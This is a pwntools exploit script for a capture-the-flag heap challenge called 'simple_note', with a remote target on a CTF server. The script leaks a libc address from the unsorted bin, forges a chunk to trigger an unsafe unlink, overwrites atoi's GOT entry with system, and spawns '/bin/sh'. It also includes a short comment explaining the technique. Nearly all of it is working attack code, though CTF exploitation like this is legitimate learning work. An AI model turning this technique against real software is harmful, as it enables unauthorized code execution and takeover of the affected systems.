from pwn import *
import sys, time

context.binary = "./simple_note-b5bdfa5fdb0fb070867ac0298a0b2a850f22e712513038d92c24c40664fac56b"
binary = ELF("./simple_note-b5bdfa5fdb0fb070867ac0298a0b2a850f22e712513038d92c24c40664fac56b")
libc = ELF("./libc.so.6-4cd1a422a9aafcdcb1931ac8c47336384554727f57a02c59806053a4693f1c71")

if len(sys.argv) == 1:
    p = process(["./simple_note-b5bdfa5fdb0fb070867ac0298a0b2a850f22e712513038d92c24c40664fac56b"], env={"LD_PRELOAD":"./libc.so.6-4cd1a422a9aafcdcb1931ac8c47336384554727f57a02c59806053a4693f1c71"})
    log.info("PID : " + str(proc.pidof(p)[0]))
    pause()

else:
    p = remote("pwn1.chal.ctf.westerns.tokyo", "16317")

def add(size, data, sending=False):
    p.recvuntil("choice: ")
    p.sendline("1")
    p.recvuntil("size: ")
    p.sendline(str(size))       # size should bigger than 128
    p.recvuntil("note: ")
    if sending:
        p.send(data)
    else:
        p.sendline(data)

def delete(idx):
    p.recvuntil("choice: ")
    p.sendline("2")
    p.recvuntil("index: ")
    p.sendline(str(idx))
    p.recvuntil("Sucess!")

def show(idx):
    p.recvuntil("choice: ")
    p.sendline("3")
    p.recvuntil("index: ")
    p.sendline(str(idx))
    p.recvuntil("Note: ")

def edit(idx, data, sending=False):
    p.recvuntil("choice: ")
    p.sendline("4")
    p.recvuntil("index: ")
    p.sendline(str(idx))
    p.recvuntil("note: ")
    if sending:
        p.send(data)
    else:
        p.sendline(data)

bssPtr = 0x6020c0 + 8*3

add(0x88, "A" * 0x87)       # index 0
add(0x88, "B" * 0x87)       # index 1
add(0x88, "D" * 0x87)       # index 2
add(0x88, "E" * 0x87)       # index 3
add(0x88, "F" * 0x87)       # index 4
add(0x88, "G" * 0x87)       # index 5
delete(0)
add(0x88, "C" * 7)          # index 0
show(0)

p.recvuntil("C" * 7 + "\n")
leak = u64(p.recv(6).ljust(8, "\x00"))          # unsorted bin fd, bk in index 0 chunk.
                                                # that address is main_arena + 88 in library.
offset = 0x3c4b78                               # So, This offset is libc_base ~ main_arena + 88 offset
libc_base = leak - offset
system = libc_base + libc.symbols["system"]
binsh = libc_base + 0x18cd17                    # useless -_-

log.info("Leak arena : " + hex(leak))
log.info("libc_base : " + hex(libc_base))
log.info("system : " + hex(system))

#exp = p64(0) * 2        # 0x10
exp = p64(0) + p64(0x80) + p64(bssPtr - 24) + p64(bssPtr - 16)      # 0x20
exp += "A" * 0x60 + p64(0x80) + p64(0x90)   # create fake chunk in index 3 chunk.
                                            # prev_size | size | fake_prev | fake_size | fake_fd | fake_bk ... | overwrite next chunk's prev_size | PREV_INUSE bit off
edit(3, exp, True)
delete(4)                                   # trigger unlink !
'''
Unsafe unlink technique is useful in this context.
Edit, Free Function dereference global variable. -> Fixed address in this binary.
If we can change that global variable area, next edit or free, etc)... ^_^
And heap overflow is needed to change next chunk's metadata. : modify prev_size, PREV_INUSE bit
Good example is in how2heap ( github )  if you want to study about heap exploit, googling this.
HITCON stkof is good unsafe unlink CTF chal example.
I'm noob at English,,, sorry for poor description....
'''

edit(3, p32(0x602058), True)                # maybe 0x602058 is atoi@got
edit(0, p64(system), True)                  # overwrite atoi@got to system.
p.sendline("/bin/sh;")                      # atoi(&buf) -> We write some string in buf.
                                            # So, if atoi -> system, and strings in buf "/bin/sh" -> system("/bin/sh");
p.interactive()
